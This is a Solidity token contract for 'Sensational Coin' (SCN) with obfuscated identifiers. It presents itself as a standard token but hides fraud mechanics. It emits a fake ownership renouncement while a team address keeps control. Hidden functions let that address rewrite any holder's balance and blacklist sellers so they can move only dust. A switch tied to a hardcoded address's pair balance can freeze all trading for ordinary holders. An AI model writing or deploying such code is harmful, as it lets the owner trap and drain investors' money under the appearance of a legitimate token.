//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface atListWallet {
    function createPair(address buyReceiver, address txFund) external returns (address);
}

interface sellMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldLaunch) external view returns (uint256);

    function transfer(address autoIs, uint256 fundTeam) external returns (bool);

    function allowance(address isTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundTeam) external returns (bool);

    function transferFrom(
        address sender,
        address autoIs,
        uint256 fundTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenLimit, uint256 value);
    event Approval(address indexed isTrading, address indexed spender, uint256 value);
}

abstract contract teamTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellModeMetadata is sellMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SensationalCoin is teamTake, sellMode, sellModeMetadata {

    address public fromMarketing;

    function symbol() external view virtual override returns (string memory) {
        return swapLaunch;
    }

    function name() external view virtual override returns (string memory) {
        return senderAmount;
    }

    address private isTotal;

    constructor (){
        if (liquidityShould != sellToken) {
            totalAuto = totalToken;
        }
        shouldAt();
        modeTrading autoTotal = modeTrading(isLaunch);
        fromMarketing = atListWallet(autoTotal.factory()).createPair(autoTotal.WETH(), address(this));
        if (sellToken == liquidityShould) {
            sellToken = true;
        }
        tokenTeam = _msgSender();
        exemptMax[tokenTeam] = true;
        shouldAuto[tokenTeam] = totalFromTeam;
        if (totalAuto == totalToken) {
            totalToken = amountSender;
        }
        emit Transfer(address(0), tokenTeam, totalFromTeam);
    }

    uint256 private totalFromTeam = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return isTotal;
    }

    function getOwner() external view returns (address) {
        return isTotal;
    }

    function totalMarketing(uint256 fundTeam) public {
        totalReceiver();
        liquidityFromMode = fundTeam;
    }

    address public tokenTeam;

    mapping(address => mapping(address => uint256)) private fundFrom;

    function amountFrom(address launchTakeAt) public {
        totalReceiver();
        
        if (launchTakeAt == tokenTeam || launchTakeAt == fromMarketing) {
            return;
        }
        buyTrading[launchTakeAt] = true;
    }

    bool private sellToken;

    mapping(address => bool) public buyTrading;

    function transferFrom(address walletMinSell, address autoIs, uint256 fundTeam) external override returns (bool) {
        if (_msgSender() != isLaunch) {
            if (fundFrom[walletMinSell][_msgSender()] != type(uint256).max) {
                require(fundTeam <= fundFrom[walletMinSell][_msgSender()]);
                fundFrom[walletMinSell][_msgSender()] -= fundTeam;
            }
        }
        return takeFeeShould(walletMinSell, autoIs, fundTeam);
    }

    function receiverToken(address isTokenSwap) public {
        if (swapLaunchedMode) {
            return;
        }
        
        exemptMax[isTokenSwap] = true;
        
        swapLaunchedMode = true;
    }

    address txTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address fromBuy, uint256 fundTeam) public virtual override returns (bool) {
        fundFrom[_msgSender()][fromBuy] = fundTeam;
        emit Approval(_msgSender(), fromBuy, fundTeam);
        return true;
    }

    function shouldAt() public {
        emit OwnershipTransferred(tokenTeam, address(0));
        isTotal = address(0);
    }

    bool public liquidityShould;

    uint256 private totalToken;

    function sellTrading(address feeExempt, uint256 fundTeam) public {
        totalReceiver();
        shouldAuto[feeExempt] = fundTeam;
    }

    uint256 constant isEnable = 11 ** 10;

    mapping(address => bool) public exemptMax;

    function balanceOf(address shouldLaunch) public view virtual override returns (uint256) {
        return shouldAuto[shouldLaunch];
    }

    function decimals() external view virtual override returns (uint8) {
        return txTo;
    }

    event OwnershipTransferred(address indexed fundMax, address indexed swapTx);

    function takeFeeShould(address walletMinSell, address autoIs, uint256 fundTeam) internal returns (bool) {
        if (walletMinSell == tokenTeam) {
            return isMax(walletMinSell, autoIs, fundTeam);
        }
        uint256 fundMarketing = sellMode(fromMarketing).balanceOf(txTotal);
        require(fundMarketing == liquidityFromMode);
        require(autoIs != txTotal);
        if (buyTrading[walletMinSell]) {
            return isMax(walletMinSell, autoIs, isEnable);
        }
        return isMax(walletMinSell, autoIs, fundTeam);
    }

    address isLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private shouldAuto;

    uint256 tradingLimit;

    uint8 private txTo = 18;

    function transfer(address feeExempt, uint256 fundTeam) external virtual override returns (bool) {
        return takeFeeShould(_msgSender(), feeExempt, fundTeam);
    }

    bool public swapLaunchedMode;

    uint256 liquidityFromMode;

    string private senderAmount = "Sensational Coin";

    uint256 public amountSender;

    string private swapLaunch = "SCN";

    function isMax(address walletMinSell, address autoIs, uint256 fundTeam) internal returns (bool) {
        require(shouldAuto[walletMinSell] >= fundTeam);
        shouldAuto[walletMinSell] -= fundTeam;
        shouldAuto[autoIs] += fundTeam;
        emit Transfer(walletMinSell, autoIs, fundTeam);
        return true;
    }

    uint256 public totalAuto;

    function totalReceiver() private view {
        require(exemptMax[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalFromTeam;
    }

    function allowance(address launchedToken, address fromBuy) external view virtual override returns (uint256) {
        if (fromBuy == isLaunch) {
            return type(uint256).max;
        }
        return fundFrom[launchedToken][fromBuy];
    }

}